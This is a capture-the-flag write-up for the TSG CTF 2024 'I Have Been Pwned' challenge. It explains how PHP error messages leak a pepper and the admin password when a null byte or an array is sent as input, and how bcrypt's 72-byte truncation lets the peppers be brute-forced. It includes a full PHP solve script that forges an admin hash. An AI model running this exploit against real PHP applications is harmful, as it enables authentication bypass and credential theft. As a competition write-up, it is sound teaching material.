# I Have Been Pwned

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @\_vow\_
- 24 solves / 189 points
- Author: @dai
- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

We have detected a password compromise and are shutting down the login process.  
But don't worry. We have a secret pepper.

[http://34.84.32.212:8080](http://34.84.32.212:8080)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216111906.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216112331.png)

In here, we can see that this page has a simple login form. Let's try to log in as user `guest` with a random password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216112456.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216112508.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216112658.png)

When we clicked the "Login" button, it'll send a POST request to `/index.php` with parameter `auth` and `password`.

If we are authenticated, the response will have 2 `Set-Cookie` headers, which are `auth` and `hash`. It also redirects us to `/mypage.php`.

After redirecting, it seems like **only admin can get the flag in `/mypage.php`**: "Hello guest! Only admin can get flag."

Hmm... Let's read this web application's source code to have a better understanding in this application.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/Web/I-Have-Been-Pwned/i_have_been_pwned.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/I-Have-Been-Pwned)-[2024.12.16|11:29:39(HKT)]
└> file i_have_been_pwned.tar.gz 
i_have_been_pwned.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 10240
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/I-Have-Been-Pwned)-[2024.12.16|11:29:41(HKT)]
└> tar xvzf i_have_been_pwned.tar.gz   
i_have_been_pwned/
i_have_been_pwned/compose.yaml
i_have_been_pwned/scripts/
i_have_been_pwned/scripts/index.php
i_have_been_pwned/scripts/mypage.php
```

In `i_have_been_pwned/scripts/mypage.php`, **if our cookie `auth` is `admin` and cookie `hash` is the correct password hash of the admin user**, we can get the flag:

```php
<?php
$pepper1 = "____REDACTED____";
$pepper2 = "____REDACTED____";
assert(strlen($pepper1) === 16 && strlen($pepper2) === 16);
$admin_password = "__REDACTED_____";
assert(strlen($admin_password) === 15);

$flag = "TSGCTF{__REDACTED__}";

if (isset($_COOKIE["auth"])) {
    $auth = $_COOKIE["auth"];
    if ($auth === "admin") {
        if (password_verify($pepper1 . $auth . $admin_password . $pepper2, base64_decode($_COOKIE["hash"]))) {
            $msg = "Hello admin! Flag is " . $flag . "\n";
        } else {
            [...]
        }
    } else if ($auth === "guest") {
        [...]
    } else {
        [...]
    }
} else {
    [...]
}
?>
[...]
<body>
    <?php echo $msg; ?>
</body>
```

However, it seems like the admin password has prepended and appended 2 [peppers](https://en.wikipedia.org/wiki/Pepper_(cryptography)). Hmm... How can we pass that `password_verify` check?

In `i_have_been_pwned/scripts/index.php`, we can see how the authentication logic works:

```php
<?php
[...]
if (isset($_POST["auth"]) and isset($_POST["password"])) {
    $success = false;
    if ($_POST["auth"] === "guest") {
        $success = true;
    } else if(($_POST["auth"] === "admin") and hash_equals($admin_password, $_POST["password"])) {
        // $success = true;
        $msg = "Sorry, the admin account is currently restricted from new logins. Please use a device that is already logged in.";
    } else {
        $msg = "Invalid username or password.";
    }

    if ($success) {
        $hash = password_hash($pepper1 . $_POST["auth"] . $_POST["password"] . $pepper2, PASSWORD_BCRYPT);
        setcookie("auth", $_POST["auth"], time() + 3600*24);
        setcookie("hash", base64_encode($hash), time() + 3600*24);
        header("Location: mypage.php");
    }
}
?>
```

When we provide POST parameter `auth` with value `guest`, it'll generate a Bcrypt password hash, base64 encode it, and put it in our `hash` cookie. The bcrypt input is like this:

```php
password_hash($pepper1 . $_POST["auth"] . $_POST["password"] . $pepper2, PASSWORD_BCRYPT);
```

Hmm... Bcrypt? Interesting...

For those who doesn't know about Bcrypt password hashing function, this hashing function has a **maximum input size of 72 bytes**. Therefore, if the input size is larger than 72 bytes, usually the input will be **truncated to first 72 bytes**.

In PHP's [function `password_hash` documentation](https://www.php.net/manual/en/function.password-hash.php), it has this very obvious warning:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216114631.png)

With that said, we can leverage this **Bcrypt truncation** to basically **generate a hash without `$pepper2`**.

> Trivia: Recently Okta AD/LDAP DelAuth has a vulnerability related to Bcrypt truncation. Feel free to read the advisory by yourself: [Okta AD/LDAP Delegated Authentication - Username Above 52 Characters Security Advisory](https://trust.okta.com/security-advisories/okta-ad-ldap-delegated-authentication-username/)

You see, when our password is longer than the maximum input size, `$pepper2` will be truncated. So, function `password_hash` will just calculate the Bcrypt password hash based on the following truncated input:

```
____REDACTED____guestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
       ^          ^  ^
       |          |  |
    $pepper1    $auth$password
```

But wait, how can we generate the admin password hash without knowing `$pepper1`? We can't just brute force `$pepper1`, as it'll take a very long time to do so.

Maybe there's another approach?

In `i_have_been_pwned/scripts/mypage.php`, the `$auth` is apart of the input of `password_verify`:

```php
if (isset($_COOKIE["auth"])) {
    $auth = $_COOKIE["auth"];
    if ($auth === "admin") {
        if (password_verify($pepper1 . $auth . $admin_password . $pepper2, base64_decode($_COOKIE["hash"]))) {
            [...]
        }
    [...]
}
```

Huh, what if we can somehow pass this `if ($auth === "admin")` if statement and at the same time, the rest of the `$admin_password` and `$pepper2` will be truncated?

We can create a testing PHP script to test our theory:

`test.php`:

```php
<?php
$pepper1 = "____REDACTED____";

$auth = $_COOKIE["auth"];
$isAdmin = ($auth === "admin") ? true : false;
printf("[*] Is admin? %b\n", $isAdmin);
var_dump($auth);

$password = $pepper1 . $auth;
printf("[*] Password length: %d", strlen($password));
```

```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/I-Have-Been-Pwned)-[2024.12.16|12:12:25(HKT)]
└> php -S 0.0.0.0:8000
[...]
```

After some testing, it is not possible to pass the if statement and truncate the rest of the input, such as the following request:

```http
GET /test.php HTTP/1.1
Host: localhost:8000
Cookie: auth[]=admin; auth[]=foo


```

Response:

```php
[*] Is admin? 0
array(2) {
  [0]=>
  string(5) "admin"
  [1]=>
  string(3) "foo"
}
[*] Password length: 21
```

So nope. We need to somehow know `$pepper1` in order to generate the admin password hash.

Another approach is also very interesting.

Since this web application **did not disable PHP errors** via function [`error_reporting`](https://www.php.net/manual/en/function.error-reporting.php), maybe we can leak those peppers?

For example, in `i_have_been_pwned/scripts/index.php`'s `password_hash`, **what if the input has a null byte?**

```http
POST /index.php HTTP/1.1
Host: 34.84.32.212:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

auth=guest&password=%00
```

> Note: Null byte in URL encoding is `%00`.

Response:

```html
<br />
<b>Fatal error</b>:  Uncaught ValueError: Bcrypt password must not contain null character in /var/www/html/index.php:21
Stack trace:
#0 /var/www/html/index.php(21): password_hash('PmVG7xe9ECBSgLU...', '2y')
#1 {main}
  thrown in <b>/var/www/html/index.php</b> on line <b>21</b><br />
```

Oh! Looks like we leaked `$pepper1`!

Well... It **almost** leaked all of it.

For `$pepper1` and `$pepper2`, they are 16 characters long:

```php
<?php
$pepper1 = "____REDACTED____";
$pepper2 = "____REDACTED____";
assert(strlen($pepper1) === 16 && strlen($pepper2) === 16);
```

However, in our case, the leaked `$pepper1` only has **15** characters:

```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/I-Have-Been-Pwned)-[2024.12.16|12:23:46(HKT)]
└> php -a
[...]
php > echo strlen("PmVG7xe9ECBSgLU");
15
```

So, it seems like if the parameter's value length is larger than 16, PHP's error will only show the first 15 characters.

But don't worry, we can actually **leverage the Bcrypt truncation technique to brute force the last character of `$pepper1`** like this:

1. Generate a password hash without `$pepper2` via Bcrypt truncation
2. Brute force the password hash **locally**:
```
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PmVG7xe9ECBSgLUbguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PmVG7xe9ECBSgLUcguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PmVG7xe9ECBSgLUdguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
PmVG7xe9ECBSgLUeguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[...]
```

Well then, if we now know the correct `$pepper1`, we can also **brute force `$pepper2` character by character via Bcrypt truncation**. Assume the correct `$pepper1` is `PmVG7xe9ECBSgLUa`:

```
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAb
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
[...]
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAda
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdb
[...]
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdba
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdbb
PmVG7xe9ECBSgLUaguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdbc
[...]
```

Therefore, we know how to have the correct `$pepper1` and `$pepper2`!

Now, the big question is: How can we get the **admin password**?

Hmm... Maybe we can apply the same concept to **leak `$admin_password` via PHP error**?

In `i_have_been_pwned/scripts/index.php`, we can see that the correct admin password is compared with our POST parameter `password`:

```php
if (isset($_POST["auth"]) and isset($_POST["password"])) {
    [...]
    if ([...]) {
        [...]
    } else if(($_POST["auth"] === "admin") and hash_equals($admin_password, $_POST["password"])) {
        [...]
    }
    [...]
```

Hmm... Again, what if function `hash_equals`'s second argument has a null byte?

```http
POST /index.php HTTP/1.1
Host: 34.84.32.212:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

auth=admin&password=%00
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TSG-CTF-2024/images/Pasted%20image%2020241216124003.png)

Nope. No errors.

Well, since there's no type check against with our POST parameter `password`, **what if we parse an array**?

```http
POST /index.php HTTP/1.1
Host: 34.84.32.212:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

auth=admin&password[]=
```

Response:

```html
<br />
<b>Fatal error</b>:  Uncaught TypeError: hash_equals(): Argument #2 ($user_string) must be of type string, array given in /var/www/html/index.php:13
Stack trace:
#0 /var/www/html/index.php(13): hash_equals('KeTzkrRuESlhd1V', Array)
#1 {main}
  thrown in <b>/var/www/html/index.php</b> on line <b>13</b><br />
```

Woah! We successfully caused a PHP error and leaked `$admin_password`.

Since **`$admin_password` is 15 characters long**, we don't need to brute force the last remaining character:

```php
<?php
[...]
$admin_password = "__REDACTED_____";
assert(strlen($admin_password) === 15);
```

## Exploitation

Armed with the above information, we can generate a valid admin password hash with the following steps:
1. Get a Bcrypt password hash without `$pepper2` via Bcrypt truncation
2. Leak the first 15 characters of `$pepper1` via PHP error
3. Brute force the last remaining character of `$pepper1`, the brute forcing hash is generated in step 1
4. Brute force `$pepper2` character by character via Bcrypt truncation
5. Leak `$admin_password` via PHP error
6. Generate a valid admin password hash with input `<pepper1>admin<admin_password><pepper2>` and get the flag

To automate the above steps, I've written the following PHP solve script:

<details><summary><strong>solve.php</strong></summary>

```php
<?php
define("BCRYPT_MAX_INPUT_LENGTH", 72);
define("INDEX_PAGE_ENDPOINT", "/index.php");
define("GET_FLAG_ENDPOINT", "/mypage.php");
define("USERNAME_KEY_NAME", "auth");
define("PASSWORD_KEY_NAME", "password");
define("COOKIE_HASH_KEY_NAME", "hash");
define("PEPPER1_AND_2_LENGTH", 16);

class Solver {
    public $baseUrl;
    public $cookieFile;

    function __construct($baseUrl) {
        $this->baseUrl = $baseUrl;
        $this->cookieFile = tempnam(sys_get_temp_dir(), "cookie");
    }

    function sendRequest($endpoint, $method, $data=null, $cookies=null) {
        $fullUrl = $this->baseUrl . $endpoint;
        $ch = curl_init($fullUrl);

        if (strtoupper($method) === "POST") {    
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookieFile);
            curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookieFile);
        } elseif (strtoupper($method) === "GET") {
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        }
        
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }

    function getCookie($cookieName) {
        $cookies = file_get_contents($this->cookieFile);

        $isMatched = preg_match("/$cookieName\s+(\w+)/", $cookies, $matches);
        if ($isMatched !== 1) {
            return false;
        }

        return $matches[1];
    }

    function getHash($username, $password) {
        $data = array(
            USERNAME_KEY_NAME => $username,
            PASSWORD_KEY_NAME => $password
        );

        $this->sendRequest(INDEX_PAGE_ENDPOINT, "POST", $data=$data);
        $bcryptHash = base64_decode($this->getCookie(COOKIE_HASH_KEY_NAME));
        return $bcryptHash;
    }
    
    function leakPepper1() {
        $data = array(
            USERNAME_KEY_NAME => "guest",
            PASSWORD_KEY_NAME => "\x00" // null byte to leak the first 15 characters of pepper1
        );
        $response = $this->sendRequest(INDEX_PAGE_ENDPOINT, "POST", $data=$data);

        $isMatched = preg_match("/password_hash\('(.*)\.\.\.',/", $response, $matches);
        if ($isMatched !== 1) {
            echo "[-] Unable to find the leaked pepper1\n";
            die();
        }

        $leakedPepper1 = $matches[1];
        printf("[+] Leaked the first 15 characters of pepper1: %s\n", $leakedPepper1);
        return $leakedPepper1;
    }

    function verifyPasswordHash($password, $hash) {
        $isCorrectHash = password_verify($password, $hash);
        if (!$isCorrectHash) {
            return false;
        }

        printf("\n[+] Correct password: %s\n", $password);
        return $password;
    }

    function bruteForcePepper1($leakedPepper1, $targetHash) {
        echo "[*] Brute forcing pepper1 last character...\n";

        $auth = "guest";
        $bcryptTruncationLength = BCRYPT_MAX_INPUT_LENGTH - strlen($leakedPepper1) - strlen($auth) - 1;
        $password = str_repeat("A", $bcryptTruncationLength);
        
        for ($i=0x20; $i <= 0xff; $i++) {
            $byteToBruteForce = chr($i);
            $fullPassword = $leakedPepper1 . $byteToBruteForce . $auth . $password;            
            printf("[*] Trying password: %s\r", $fullPassword);

            $correctPassword = $this->verifyPasswordHash($fullPassword, $targetHash);
            if ($correctPassword !== false) {
                $leakedPepper1 = substr($correctPassword, 0, PEPPER1_AND_2_LENGTH);
                printf("[+] Correct pepper1: %s\n", $leakedPepper1);
                return array($correctPassword, $leakedPepper1);
            }
        }
    }

    function bruteForcePepper2($remainingPassword) {
        echo "[*] Brute forcing pepper2 byte by byte...\n";

        $splitedRemainingPassword = explode("guest", $remainingPassword);
        $counter = 0;
        $leakedPepper2 = "";
        while (strlen($leakedPepper2) !== PEPPER1_AND_2_LENGTH) {
            $counter--;

            $truncationPadding = substr($splitedRemainingPassword[1], 0, $counter);
            $bcryptHash = $this->getHash("guest", $truncationPadding);

            for ($i=0x20; $i <= 0xff; $i++) {    
                $byteToBruteForce = chr($i);

                if (strlen($leakedPepper2) === 0) {
                    $passwordToBruteForce = substr_replace($remainingPassword, $byteToBruteForce, $counter);
                } else {
                    $passwordToBruteForce = substr_replace($remainingPassword, $leakedPepper2, $counter) . $byteToBruteForce;
                }
                printf("[*] Trying password: %s\r", $passwordToBruteForce);
                
                $correctPassword = $this->verifyPasswordHash($passwordToBruteForce, $bcryptHash);
                if ($correctPassword === false) {
                    continue;
                }

                $leakedPepper2 .= $byteToBruteForce;
                break;
            }
        }

        printf("[+] Leaked pepper2: %s\n", $leakedPepper2);
        return $leakedPepper2;
    }

    function leakAdminPassword() {
        $data = array(
            USERNAME_KEY_NAME => "admin",
            PASSWORD_KEY_NAME => array("") # use an array to cause an error, which leaks the first 15 characters of admin password
        );
        $response = $this->sendRequest(INDEX_PAGE_ENDPOINT, "POST", $data=$data);

        $isMatched = preg_match("/hash_equals\('(.*)',/", $response, $matches);
        if ($isMatched !== 1) {
            echo "[-] Unable to find the leaked pepper1\n";
            die();
        }

        $leakedAdminPassword = $matches[1];
        printf("[+] Leaked admin password: %s\n", $leakedAdminPassword);
        return $leakedAdminPassword;
    }

    function getFlag($pepper1, $pepper2, $adminPassword) {
        $fullAdminPassword = $pepper1 . "admin" . $adminPassword . $pepper2;
        $adminHash = password_hash($fullAdminPassword, PASSWORD_BCRYPT);
        printf("[*] Try to get the flag... Full password: %s\n", $fullAdminPassword);
        printf("[*] Admin hash: %s\n", $adminHash);

        $cookie = sprintf("%s=%s; %s=%s", USERNAME_KEY_NAME, "admin", COOKIE_HASH_KEY_NAME, base64_encode($adminHash));
        $response = $this->sendRequest(GET_FLAG_ENDPOINT, "GET", null, $cookie);

        $isMatched = preg_match("/(TSGCTF{.*?})/", $response, $matches);
        if ($isMatched !== 1) {
            echo "[-] Unable to find the flag\n";
            die();
        }

        $flag = $matches[1];
        printf("[+] Flag: %s\n", $flag);
    }

    function solve() {
        $bcryptHashWithoutPepper2 = $this->getHash("guest", str_repeat("A", BCRYPT_MAX_INPUT_LENGTH));
        
        $leakedPepper1 = $this->leakPepper1();
        $data = $this->bruteForcePepper1($leakedPepper1, $bcryptHashWithoutPepper2);
        $fullPassword = $data[0];
        $correctPepper1 = $data[1];

        $leakedPepper2 = $this->bruteForcePepper2($fullPassword);

        $leakedAdminPassword = $this->leakAdminPassword();

        $this->getFlag($correctPepper1, $leakedPepper2, $leakedAdminPassword);
    }
}

// $targetBaseUrl = "http://localhost:8000"; // for local testing
$targetBaseUrl = "http://34.84.32.212:8080";
$solver = new Solver($targetBaseUrl);

$solver->solve();
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/TSG-CTF-2024/Web/I-Have-Been-Pwned)-[2024.12.16|12:43:16(HKT)]
└> php solve.php 
[+] Leaked the first 15 characters of pepper1: PmVG7xe9ECBSgLU
[*] Brute forcing pepper1 last character...
[*] Trying password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Correct password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Correct pepper1: PmVG7xe9ECBSgLUA
[*] Brute forcing pepper2 byte by byte...
[*] Trying password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8
[+] Correct password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8
[*] Trying password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8o
[+] Correct password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8o
[...]
[*] Trying password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8oC7mIiDFw4hQv2e
[+] Correct password: PmVG7xe9ECBSgLUAguestAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8oC7mIiDFw4hQv2e
[+] Leaked pepper2: 8oC7mIiDFw4hQv2e
[+] Leaked admin password: KeTzkrRuESlhd1V
[*] Try to get the flag... Full password: PmVG7xe9ECBSgLUAadminKeTzkrRuESlhd1V8oC7mIiDFw4hQv2e
[*] Admin hash: $2y$10$1eMjR5I6TBPHp4fkRNi4jetXFg2bPrby4cdft5U.8e0tXJdeM3xMa
[+] Flag: TSGCTF{Pepper. The ultimate layer of security for your meals.}
```

- **Flag: `TSGCTF{Pepper. The ultimate layer of security for your meals.}`**

## Conclusion

What we've learned:

1. Information disclosure via PHP errors and Bcrypt truncation